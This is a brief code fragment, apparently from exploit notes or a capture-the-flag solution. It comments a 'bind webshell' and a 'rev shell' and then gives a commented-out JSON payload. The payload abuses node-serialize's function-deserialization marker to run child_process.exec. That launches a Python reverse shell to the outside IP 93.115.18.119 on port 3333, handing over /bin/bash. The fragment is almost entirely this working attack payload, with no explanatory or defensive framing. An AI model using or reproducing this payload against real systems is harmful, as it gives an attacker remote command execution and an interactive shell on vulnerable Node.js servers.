...
// bind webshell (won't work on deployment)
...
// rev shell
//{"rce":"_$$ND_FUNC$$_function() {require('child_process').exec('python3 -c \\'import os,pty,socket;s=socket.socket();s.connect((\"93.115.18.119\",3333));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")\\'', (error, stdout, stderr) => { console.log(stdout); }); }()"}